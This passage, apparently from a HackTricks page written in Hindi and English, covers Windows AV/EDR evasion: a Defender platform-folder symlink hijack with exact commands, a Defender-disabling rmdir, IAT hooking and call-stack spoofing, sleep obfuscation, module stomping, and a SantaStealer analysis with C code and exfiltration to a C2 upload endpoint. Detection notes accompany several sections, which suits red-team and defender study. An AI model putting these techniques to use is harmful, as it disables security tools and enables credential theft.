- Reboot करने या Defender platform re-selection trigger करने की क्षमता (boot पर service restart)
- केवल built-in tools required (mklink)

यह कैसे काम करता है
- Defender अपने folders में writes block करता है, लेकिन उसका platform selection directory entries पर trust करता है और lexicographically highest version चुनता है, बिना यह validate किए कि target protected/trusted path पर resolve होता है या नहीं।

Step-by-step (example)
1) current platform folder का writable clone तैयार करें, जैसे `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform के अंदर अपने फ़ोल्डर की ओर इशारा करने वाला एक higher-version directory symlink बनाएं:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) ट्रिगर चयन (reboot अनुशंसित):
```cmd
shutdown /r /t 0
```
4) सत्यापित करें कि MsMpEng.exe (WinDefend) redirected path से चलता है:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
आपको `C:\TMP\AV\` के तहत नई process path देखनी चाहिए और service configuration/registry में वही location reflect होनी चाहिए।

Post-exploitation options
- DLL sideloading/code execution: Defender जो DLLs अपनी application directory से load करता है, उन्हें drop/replace करें ताकि Defender के processes में code execute हो सके। ऊपर वाला section देखें: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink हटाएँ ताकि next start पर configured path resolve न हो और Defender start होने में fail हो:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> ध्यान दें कि यह तकनीक अपने आप privilege escalation नहीं देती; इसके लिए admin rights चाहिए।

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams runtime evasion को C2 implant से निकालकर target module के अंदर ही ले जा सकते हैं, उसके Import Address Table (IAT) को hook करके और चुनी हुई APIs को attacker-controlled, position‑independent code (PIC) के जरिए route करके। यह evasion को उन छोटे API surface से आगे बढ़ाता है जो कई kits expose करती हैं (जैसे CreateProcessA), और वही protections BOFs और post‑exploitation DLLs तक भी बढ़ाता है।

High-level approach
- Reflective loader (prepended या companion) का उपयोग करके target module के साथ एक PIC blob stage करें। PIC self-contained और position-independent होना चाहिए।
- जैसे ही host DLL load होता है, उसके IMAGE_IMPORT_DESCRIPTOR को walk करें और targeted imports (जैसे CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) के लिए IAT entries को patch करके उन्हें thin PIC wrappers पर point करें।
- हर PIC wrapper real API address पर tail-calling करने से पहले evasions execute करता है। Typical evasions में शामिल हैं:
- Call के आसपास memory mask/unmask (जैसे beacon regions encrypt करना, RWX→RX, page names/permissions बदलना) और फिर post-call restore करना।
- Call-stack spoofing: एक benign stack construct करना और target API में transition करना ताकि call-stack analysis expected frames पर resolve हो।
- Compatibility के लिए, एक interface export करें ताकि Aggressor script (या equivalent) यह register कर सके कि Beacon, BOFs और post-ex DLLs के लिए किन APIs को hook करना है।

Why IAT hooking here
- किसी भी code पर काम करता है जो hooked import use करता है, बिना tool code modify किए या Beacon पर specific APIs proxy करने के लिए निर्भर हुए।
- post-ex DLLs को cover करता है: LoadLibrary* को hook करने से आप module loads (जैसे System.Management.Automation.dll, clr.dll) intercept कर सकते हैं और उनकी API calls पर वही masking/stack evasion लागू कर सकते हैं।
- CreateProcessA/W को wrap करके call-stack–based detections के खिलाफ process-spawning post-ex commands का reliable use वापस लाता है।

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
नोट्स
- relocations/ASLR के बाद और import के पहले use से पहले patch लागू करें। TitanLdr/AceLdr जैसे reflective loaders loaded module के DllMain के दौरान hooking दिखाते हैं।
- wrappers को tiny और PIC-safe रखें; patching से पहले capture किए गए original IAT value या LdrGetProcedureAddress के जरिए true API resolve करें।
- PIC के लिए RW → RX transitions use करें और writable+executable pages छोड़ने से बचें।

Call‑stack spoofing stub
- Draugr‑style PIC stubs fake call chain बनाते हैं (benign modules में return addresses) और फिर real API में pivot करते हैं।
- यह उन detections को bypass करता है जो Beacon/BOFs से sensitive APIs तक canonical stacks expect करती हैं।
- API prologue से पहले expected frames में land करने के लिए stack cutting/stack stitching techniques के साथ pair करें।

Operational integration
- reflective loader को post‑ex DLLs के आगे prepend करें ताकि PIC और hooks DLL load होते ही automatically initialise हो जाएँ।
- target APIs register करने के लिए Aggressor script use करें ताकि Beacon और BOFs बिना code changes के same evasion path से transparently benefit करें।

Detection/DFIR considerations
- IAT integrity: entries जो non‑image (heap/anon) addresses पर resolve होती हैं; import pointers की periodic verification।
- Stack anomalies: return addresses जो loaded images का हिस्सा नहीं हैं; non‑image PIC में abrupt transitions; inconsistent RtlUserThreadStart ancestry।
- Loader telemetry: in‑process writes to IAT, early DllMain activity जो import thunks modify करती है, load पर बने unexpected RX regions।
- Image‑load evasion: अगर hooking LoadLibrary* कर रहे हैं, तो automation/clr assemblies के suspicious loads को monitor करें जो memory masking events के साथ correlated हों।

Related building blocks and examples
- Reflective loaders जो load के दौरान IAT patching perform करते हैं (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) और stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

अगर आप reflective loader control करते हैं, तो आप `ProcessImports()` के **दौरान** imports hook कर सकते हैं, loader के `GetProcAddress` pointer को एक custom resolver से replace करके जो पहले hooks check करे:

- एक **resident PICO** (persistent PIC object) बनाएं जो transient loader PIC के खुद को free करने के बाद भी survive करे।
- `setup_hooks()` function export करें जो loader के import resolver को overwrite करे (e.g., `funcs.GetProcAddress = _GetProcAddress`)।
- `_GetProcAddress` में, ordinal imports skip करें और hash-based hook lookup जैसे `__resolve_hook(ror13hash(name))` use करें। अगर hook मौजूद है, तो उसे return करें; नहीं तो real `GetProcAddress` को delegate करें।
- Crystal Palace `addhook "MODULE$Func" "hook"` entries के साथ link time पर hook targets register करें। Hook valid रहता है क्योंकि वह resident PICO के अंदर live होता है।

यह loaded DLL के code section को post-load patch किए बिना **import-time IAT redirection** देता है।

### जब target PEB-walking use करता हो, तब hookable imports force करना

Import-time hooks तभी trigger होंगे जब function सच में target की IAT में हो। अगर कोई module PEB-walk + hash से APIs resolve करता है (कोई import entry नहीं), तो loader के `ProcessImports()` path को उसे देखने देने के लिए real import force करें:

- Hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) को direct reference जैसे `&WaitForSingleObject` से replace करें।
- Compiler IAT entry emit करेगा, जिससे reflective loader imports resolve करते समय interception enable होगी।

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

`Sleep` patch करने के बजाय, implant द्वारा use किए जाने वाले **actual wait/IPC primitives** hook करें (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`)। लंबे waits के लिए, call को Ekko-style obfuscation chain में wrap करें जो idle के दौरान in-memory image को encrypt करती है:

- `CreateTimerQueueTimer` use करें ताकि callbacks की sequence schedule हो जो crafted `CONTEXT` frames के साथ `NtContinue` call करें।
- Typical chain (x64): image को `PAGE_READWRITE` पर set करें → पूरे mapped image पर `advapi32!SystemFunction032` के जरिए RC4 encrypt करें → blocking wait perform करें → RC4 decrypt करें → PE sections walk करके **per-section permissions restore** करें → completion signal करें।
- `RtlCaptureContext` एक template `CONTEXT` देता है; उसे multiple frames में clone करें और registers (`Rip/Rcx/Rdx/R8/R9`) set करके हर step invoke करें।

Operational detail: long waits के लिए “success” return करें (e.g., `WAIT_OBJECT_0`) ताकि caller image masked रहते हुए continue करे। यह pattern idle windows के दौरान module को scanners से hide करता है और classic “patched `Sleep()`” signature से बचाता है।

Detection ideas (telemetry-based)
- `CreateTimerQueueTimer` callbacks के bursts जो `NtContinue` की ओर point करते हैं।
- `advapi32!SystemFunction032` का large contiguous image-sized buffers पर use।
- Large-range `VirtualProtect` के बाद custom per-section permission restoration।


## Precision Module Stomping

Module stomping payloads को target process में पहले से mapped **DLL के `.text` section** से execute करता है, बजाय obvious private executable memory allocate करने या fresh sacrificial DLL load करने के। Overwrite target एक **loaded, disk-backed image** होना चाहिए जिसकी code space payload को absorb कर सके, बिना उन code paths को corrupt किए जिन्हें process अभी भी use करता है।

### Reliable target selection

Common modules जैसे `uxtheme.dll` या `comctl32.dll` के खिलाफ naive stomping fragile है: remote process में DLL loaded न भी हो, और code region बहुत छोटा हो तो process crash हो सकता है। अधिक reliable workflow यह है:

1. Target process modules enumerate करें और पहले से loaded DLLs की **names-only include list** रखें।
2. Payload पहले build करें और उसका **exact byte size** record करें।
3. Disk पर candidate DLLs scan करें और PE section **`.text` `Misc_VirtualSize`** को payload size से compare करें। यह file size से ज्यादा महत्वपूर्ण है क्योंकि यह executable section का size दर्शाता है **जब वह memory में mapped हो**।
4. **Export Address Table (EAT)** parse करें और stomp start offset के लिए exported function RVA चुनें।
5. **Blast radius** calculate करें: अगर payload selected function boundary से बड़ा है, तो यह memory में उसके बाद पड़े adjacent exports को overwrite कर देगा।

Wild में देखे जाने वाले typical recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
ऑपरेशनल नोट्स
- दूरस्थ प्रक्रिया में `LoadLibrary`/अनपेक्षित image loads की telemetry से बचने के लिए **पहले से loaded** DLLs को प्राथमिकता दें।
- उन exports को प्राथमिकता दें जिन्हें target application शायद ही कभी execute करता है; वरना normal code paths thread creation से पहले या बाद में stomped bytes को hit कर सकते हैं।
- बड़े implants के लिए अक्सर shellcode embedding को string literal से बदलकर **byte-array/braced initializer** करना पड़ता है, ताकि injector source में पूरा buffer सही तरह represent हो।

Detection ideas
- अधिक सामान्य private RWX/RX allocations के बजाय **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) में remote writes।
- ऐसे export entry points जिनके in-memory bytes अब backing file on disk से मेल नहीं खाते।
- Remote threads या context pivots जो किसी legitimate DLL export के अंदर execution शुरू करते हैं, जिसके पहले bytes हाल ही में modify किए गए थे।
- DLL `.text` pages के खिलाफ संदिग्ध `VirtualProtect(Ex)` / `WriteProcessMemory` sequences, जिसके बाद thread creation हो।

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) दिखाता है कि modern info-stealers कैसे AV bypass, anti-analysis और credential access को एक ही workflow में blend करते हैं।

### Keyboard layout gating & sandbox delay

- एक config flag (`anti_cis`) `GetKeyboardLayoutList` के जरिए installed keyboard layouts enumerates करता है। अगर कोई Cyrillic layout मिलता है, तो sample एक खाली `CIS` marker drop करता है और stealers चलाने से पहले terminate हो जाता है, जिससे यह excluded locales पर कभी detonate नहीं होता, जबकि एक hunting artifact छोड़ता है।
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A process list को walk करता है, हर name को custom rolling checksum से hash करता है, और उसे debuggers/sandboxes के embedded blocklists से compare करता है; यह computer name पर भी checksum दोहराता है और `C:\analysis` जैसी working directories को check करता है।
- Variant B system properties inspect करता है (process-count floor, recent uptime), VirtualBox additions detect करने के लिए `OpenServiceA("VBoxGuest")` call करता है, और single-stepping spot करने के लिए sleeps के around timing checks करता है। कोई भी hit modules launch होने से पहले abort कर देता है।

### Fileless helper + double ChaCha20 reflective loading

- Primary DLL/EXE एक Chromium credential helper embed करता है, जिसे या तो disk पर drop किया जाता है या manually in-memory map किया जाता है; fileless mode imports/relocations खुद resolve करता है, इसलिए कोई helper artifacts write नहीं होते।
- वह helper second-stage DLL store करता है जो ChaCha20 से दो बार encrypt होती है (दो 32-byte keys + 12-byte nonces)। दोनों passes के बाद, यह blob को reflectively load करता है (`LoadLibrary` नहीं) और [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) से derived exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` call करता है।
- ChromElevator routines direct-syscall reflective process hollowing का use करके live Chromium browser में inject करती हैं, AppBound Encryption keys inherit करती हैं, और ABE hardening के बावजूद SQLite databases से passwords/cookies/credit cards सीधे decrypt करती हैं।


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer table को iterate करता है और हर enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, आदि) के लिए one thread spawn करता है। हर thread results को shared buffers में write करता है और ~45s join window के बाद अपनी file count report करता है।
- Finish होने के बाद, सब कुछ statically linked `miniz` library से `%TEMP%\\Log.zip` के रूप में zip किया जाता है। फिर `ThreadPayload1` 15s sleep करता है और archive को 10 MB chunks में HTTP POST के जरिए `http://<C2>:6767/upload` पर stream करता है, browser के `multipart/form-data` boundary (`----WebKitFormBoundary***`) को spoof करते हुए। हर chunk `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` जोड़ता है, और last chunk `complete: true` appends करता है ताकि C2 को पता चले कि reassembly done है।

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
